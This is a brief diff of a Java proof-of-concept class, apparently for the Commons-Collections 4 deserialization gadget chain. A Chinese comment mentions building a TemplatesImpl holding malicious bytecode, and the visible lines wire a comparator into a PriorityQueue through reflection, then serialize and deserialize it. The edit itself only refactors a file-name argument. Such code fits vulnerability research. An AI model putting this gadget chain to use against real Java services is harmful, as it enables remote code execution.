@@ -18,8 +18,6 @@ import java.util.PriorityQueue;
  */
 public class CC4 {
 
-	public static String fileName = "CC4.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -42,7 +40,7 @@ public class CC4 {
 		field.setAccessible(true);
 		field.set(queue, comparator);
 
-		SerializeUtil.writeObjectToFile(queue, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(queue);
+		SerializeUtil.readFileObject();
 	}
 }
